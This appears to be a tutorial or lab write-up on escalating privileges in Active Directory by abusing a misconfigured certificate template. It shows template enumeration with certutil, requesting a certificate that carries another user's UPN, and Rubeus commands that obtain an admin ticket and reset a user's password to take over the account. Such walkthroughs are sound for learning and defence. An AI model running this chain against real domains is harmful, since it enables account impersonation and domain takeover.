Active Directory Certificate Services (AD CS) is Microsoft's PKI solution integrated into Active Directory, used for encrypting files, verifying digital signatures, and user authentication. Unlike public CAs, AD CS can issue certificates internally, which can be used for internal applications without internet access.<br>
The diagram below shows what the flow for certificate requests and generation looks like:

![6abc4f005b619e77d22020817efcd569](https://github.com/user-attachments/assets/3ba2536a-e948-4c2f-8574-ba64bc653edd)<br>



Before we dive deeper into certificate abuse, some terminology:

> PKI - Public Key Infrastructure is a system that manages certificates and public key encryption<br>
> AD CS - Active Directory Certificate Services is Microsoft's PKI implementation which usually runs on domain controllers<br>
> CA - Certificate Authority is a PKI that issues certificates<br>
> Certificate Template - a collection of settings and policies that defines how and when a certificate may be issued by a CA<br>
> CSR - Certificate Signing Request is a message sent to a CA to request a signed certificate<br>
> EKU - Extended/Enhanced Key Usage are object identifiers that define how a generated certificate may be used<br>


**Certificate template enumeration:**

```
certutil -v -template > cert_templates.txt
```

the outpute of this file may be difficult to read but we are looking for some indicators will tell us that one of the templates is vulnerable. THere is 3 of them to generate a malicious certificate.

1) *Parameter 1: Relevant Permissions*

  We are essentially looking for a template where our user has either the ```Allow Enroll``` or ```Allow Full Control``` permission. You will probably never find a certificate where you have the Allow Full Control permission. However, if you do, congratulations! You can misconfigure the template yourself to make it vulnerable! But for now, let's focus on Allow Enroll.<br>
the *cert_templates.txt* contains the *Allow Enroll* permission setting to *Domain Users* 
  ```
 Allow Enroll	LUNAR\Domain Users
```
  
3) *Parameter 2: Client Authentication*
   To ensure a certificate is suitable for Kerberos authentication, check for the ```Client Authentication``` Extended Key Usage (EKU) in the certificate templates. This EKU allows the certificate to be used for client authentication.
   
5) *Parameter 3: Client Specifies SAN*
  ensure the certificate template allows you to specify the Subject Alternative Name (SAN). Look for the ```CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT``` property flag set to ```1```, indicating you can control the SAN. If a template meets all required conditions, including this SAN capability, you could escalate to Enterprise Admin rights with the right setup.<br>
**Impersonation via SAN:**
    > When a UPN is included in the SAN field of a certificate, it allows the certificate to be associated with a specific user account.<br>
    > If an attacker can obtain a certificate with the UPN of a target account in the SAN field, they can potentially impersonate that user.<br>
    > This certificate can be used in authentication protocols like Kerberos or mutual TLS, where the identity of the user is validated based on the certificate.<br>
   > The system will trust the certificate as if it was issued legitimately to the user, allowing the attacker to access resources and perform actions as if they were the target user.<br>

**UPN** ```Is the username used to log into a domain, formatted as username@domain.com```<br>

**Generating a malicious certificate**

Now that we identified a certificate template that we can exploit, it is time to generate the certificate request.<br>
Hereâ€™s the steps for requesting and exporting a certificate using MMC:
```
   1 Open MMC:
        Type mmc in a Run window and press Enter.

   2 Add Certificates Snap-in:
        Click File -> Add/Remove Snap-in...
        Select Certificates and click Add.

  3 Request a New Certificate:
        Expand Certificates -> Personal.
        Right-click on Personal, select All Tasks, then click Request New Certificate...

   4 Proceed with Request:
        Click Next twice to proceed with default CA settings.

   5 Provide Certificate Details:
        Click More information is required to enroll this certificate  (the vulnarable one).

   6 Configure Certificate Properties:
        Change Subject name Type to Common Name and provide the desired certificate name.
        Change Alternative name Type to User principal name (UPN) and provide the UPN of the account you wish to impersonate (e.g., svc.gitlab@lunar.eruca.com).

   7 Enroll the Certificate:
        Click OK to add properties.
        Complete the certificate enrollment.

   8 Export the Certificate:
        Right-click the certificate under Personal -> Certificates.
        Select All Tasks, then click Export...
        Follow the prompts to export, ensuring to export the private key as well.
        Choose PKCS #12 (.pfx) format and set a password for the private key.
        Save the certificate to a file.
```


**User impersonation through a certificate**
<br>

Now we can finally impersonate a user. To perform this, two steps are required:
   > Use the certificate to request a Kerberos ticket granting ticket (TGT).<br>
   > Load the Kerberos TGT into your hacking platform of choice(we will use Rubues).

We will use the following command to request the TGT:<br>
```Rubeus.exe asktgt /user:<UserHavingAdminAccessToImpersonate> /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:<name of file to write TGT to> /domain:<DomainName> /dc:<IP of domain controller>``` <br>

| Option | Description |
|---|---|
| /user | Specifies the user that we will impersonate and must match the UPN for the certificate we generated. |
| /dc | The IP of the domain controller where we are requesting the TGT from. Usually it's best to select a DC that has a CA service running. |

To know that the CA service running or not you can use this command ```certutil -ping <DomainControllerName>```<br>
![Screenshot from 2024-08-31 02-40-05](https://github.com/user-attachments/assets/792f230c-79ce-4917-8303-1fe6c8b61167)


NOw we have an administrative TGT, we can change password of an admin user to take over his account or do ```runas``` command.
```
Rubeus.exe changepw /ticket:<path to ticket file> /new:<new password for user> /dc:<MachineHaveCARunning> /targetuser:<DomainName>\<usernameWeChangeHisPassword>
```
Finally, we could use ```runas /user:<DominName>\<usernameWeChangedHisPassword> cmd.exe```
   
    
